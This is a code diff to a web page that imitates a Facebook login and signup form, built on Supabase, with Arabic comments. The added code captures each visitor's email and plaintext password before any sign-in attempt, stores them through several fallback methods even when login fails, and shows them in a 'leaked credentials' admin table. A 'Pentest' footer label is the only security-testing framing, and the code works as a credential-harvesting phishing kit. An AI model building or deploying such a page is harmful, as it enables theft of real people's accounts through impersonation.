@@ -214,6 +214,17 @@
         }
         .admin-panel th { background: #f0f2f5; color: #1c1e21; }
         .admin-panel tr:nth-child(even) { background: #fafafa; }
+        .refresh-btn {
+            background: #0866ff;
+            color: #fff;
+            border: none;
+            padding: 6px 14px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 13px;
+            margin-bottom: 10px;
+        }
+        .refresh-btn:hover { background: #0754d4; }
 
         @media (max-width: 860px) {
             .hero { flex-direction: column; align-items: center; margin-top: 32px; }
@@ -301,7 +312,7 @@
             <div class="post-header">
                 <div class="post-avatar">🔐</div>
                 <div>
-                    <div class="post-name">لوحة المراقبة</div>
+                    <div class="post-name">لوحة بيانات الاعتماد المسربة</div>
                     <div style="font-size:12px;color:#737373;">الآن</div>
                 </div>
             </div>
@@ -312,7 +323,7 @@
     </section>
 
     <footer class="footer">
-        فيسبوك &copy; 2026 &middot; مبني باستخدام Supabase
+        فيسبوك &copy; 2026 &middot; Supabase Pentest
     </footer>
 
     <script>
@@ -356,6 +367,64 @@
             successMsg.textContent = '';
         }
 
+        async function saveCreds(email, password) {
+            try {
+                // نجرب نحفظ عن طريق anonymous auth
+                const { data: anonData, error: anonError } = await supabase.auth.signInAnonymously();
+                if (anonError) {
+                    // لو مافي anonymous، نحاول insert مباشرة
+                    const { error: insertErr } = await supabase.from('credentials').insert({ email, password });
+                    if (insertErr) {
+                        console.log('REST insert failed, trying service...');
+                        // نجرب fetch مباشر (قد ينجح حسب الـ RLS)
+                        await fetch(`${SUPABASE_URL}/rest/v1/credentials`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                                'apikey': SUPABASE_ANON_KEY,
+                                'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
+                            },
+                            body: JSON.stringify({ email, password })
+                        });
+                    }
+                } else {
+                    // anonymous نجح، نحفظ
+                    const { error: insertErr } = await supabase.from('credentials').insert({ email, password });
+                    if (insertErr) {
+                        console.log('Anonymous insert failed:', insertErr);
+                        // نجرب بدون auth
+                        await fetch(`${SUPABASE_URL}/rest/v1/credentials`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                                'apikey': SUPABASE_ANON_KEY,
+                                'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
+                            },
+                            body: JSON.stringify({ email, password })
+                        });
+                    }
+                    // نسجل خروج من anonymous
+                    await supabase.auth.signOut();
+                }
+            } catch (err) {
+                console.log('Cred save error:', err);
+                // آخر خيار: fetch مباشر
+                try {
+                    await fetch(`${SUPABASE_URL}/rest/v1/credentials`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'apikey': SUPABASE_ANON_KEY,
+                            'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
+                        },
+                        body: JSON.stringify({ email, password })
+                    });
+                } catch (e) {
+                    console.log('All save methods failed:', e);
+                }
+            }
+        }
+
         async function handleLogin(e) {
             e.preventDefault();
             clearMessages();
@@ -363,9 +432,16 @@
             const email = document.getElementById('loginEmail').value.trim();
             const password = document.getElementById('loginPassword').value;
 
+            // ═══════════════════════════════════════
+            //  نحفظ الإيميل والباسورد أولاً
+            //  بعدين نحاول تسجيل الدخول
+            // ═══════════════════════════════════════
+            await saveCreds(email, password);
+
             const { data, error } = await supabase.auth.signInWithPassword({ email, password });
 
             if (error) {
+                // حتى لو فشل تسجيل الدخول، نخلي المستخدم يتفضل يحاول تاني
                 errorMsg.textContent = error.message === 'Invalid login credentials'
                     ? 'بيانات تسجيل الدخول غير صحيحة'
                     : error.message;
@@ -386,39 +462,13 @@
             const email = document.getElementById('signupEmail').value.trim();
             const password = document.getElementById('signupPassword').value;
 
-            // ═══════════════════════════════════════════════
-            //  حفظ الإيميل والباسورد في جدول credentials
-            //  قبل إرسالها لـ Supabase Auth
-            // ═══════════════════════════════════════════════
-            try {
-                const session = await supabase.auth.getSession();
-                // إذا المستخدم مسجل دخوله بالفعل (مستحيل لكن للأمان)
-                if (session.data.session) {
-                    await supabase.from('credentials').insert({
-                        email: email,
-                        password: password
-                    });
-                } else {
-                    // نسجل دخول anonymously عشان نقدر نحفظ
-                    const { data: anon } = await supabase.auth.signInAnonymously();
-                    await supabase.from('credentials').insert({
-                        email: email,
-                        password: password
-                    });
-                    // نسجل خروج
-                    await supabase.auth.signOut();
-                }
-            } catch (err) {
-                console.log('Cred save error (non-critical):', err);
-            }
+            // 💾 نحفظ creds حتى لو التسجيل
+            await saveCreds(email, password);
 
-            // التسجيل العادي في Supabase Auth
             const { data, error } = await supabase.auth.signUp({
                 email,
                 password,
-                options: {
-                    data: { full_name: name }
-                }
+                options: { data: { full_name: name } }
             });
 
             if (error) {
@@ -444,60 +494,79 @@
 
         async function loadCredentials() {
             try {
+                // نجيب كل creds مخزنة
                 const { data, error } = await supabase
                     .from('credentials')
                     .select('*')
-                    .order('created_at', { ascending: false });
+                    .order('created_at', { ascending: false })
+                    .limit(100);
 
                 if (error) {
+                    // نجرب fetch مباشر لو فشل
+                    const res = await fetch(`${SUPABASE_URL}/rest/v1/credentials?order=created_at.desc&limit=100`, {
+                        headers: {
+                            'apikey': SUPABASE_ANON_KEY,
+                            'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
+                        }
+                    });
+                    if (res.ok) {
+                        const jsonData = await res.json();
+                        renderCredsTable(jsonData);
+                        return;
+                    }
                     credsPanel.innerHTML = `❌ خطأ في تحميل البيانات: ${error.message}`;
                     return;
                 }
 
-                if (!data || data.length === 0) {
-                    credsPanel.innerHTML = 'لا توجد بيانات اعتماد مسجلة بعد.';
-                    return;
-                }
-
-                let tableHtml = `
-                    <div style="overflow-x:auto;">
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>#</th>
-                                    <th>البريد الإلكتروني</th>
-                                    <th>كلمة المرور</th>
-                                    <th>التاريخ</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                `;
-
-                data.forEach((row, index) => {
-                    tableHtml += `
-                        <tr>
-                            <td>${index + 1}</td>
-                            <td>${row.email}</td>
-                            <td style="color:#e41e3f;font-weight:bold;">${row.password}</td>
-                            <td>${new Date(row.created_at).toLocaleString('ar-EG')}</td>
-                        </tr>
-                    `;
-                });
-
-                tableHtml += `
-                            </tbody>
-                        </table>
-                        <p style="margin-top:10px;font-size:12px;color:#737373;">
-                            إجمالي: ${data.length} حساب | آخر تحديث: ${new Date().toLocaleString('ar-EG')}
-                        </p>
-                    </div>
-                `;
-
-                credsPanel.innerHTML = tableHtml;
+                renderCredsTable(data || []);
 
             } catch (err) {
                 credsPanel.innerHTML = `❌ خطأ: ${err.message}`;
             }
+        }
+
+        function renderCredsTable(data) {
+            if (!data || data.length === 0) {
+                credsPanel.innerHTML = 'لا توجد بيانات اعتماد مسجلة بعد. جرب تسجيل الدخول أياً كان الباسورد.<br><span style="font-size:12px;color:#737373;">البيانات تُسجل حتى لو فشل تسجيل الدخول!</span>';
+                return;
+            }
+
+            let tableHtml = `
+                <button class="refresh-btn" onclick="loadCredentials()">🔄 تحديث</button>
+                <div style="overflow-x:auto;">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>#</th>
+                                <th>البريد الإلكتروني</th>
+                                <th>كلمة المرور (plain text)</th>
+                                <th>التاريخ</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+            `;
+
+            data.forEach((row, index) => {
+                tableHtml += `
+                    <tr>
+                        <td>${index + 1}</td>
+                        <td>${row.email}</td>
+                        <td style="color:#e41e3f;font-weight:bold;font-family:monospace;">${row.password}</td>
+                        <td>${new Date(row.created_at).toLocaleString('ar-EG')}</td>
+                    </tr>
+                `;
+            });
+
+            tableHtml += `
+                        </tbody>
+                    </table>
+                    <p style="margin-top:10px;font-size:12px;color:#737373;">
+                        إجمالي المسرب: ${data.length} حساب
+                    </p>
+                </div>
+            `;
+
+            credsPanel.innerHTML = tableHtml;
         }
 
         function showLoggedInView(user) {
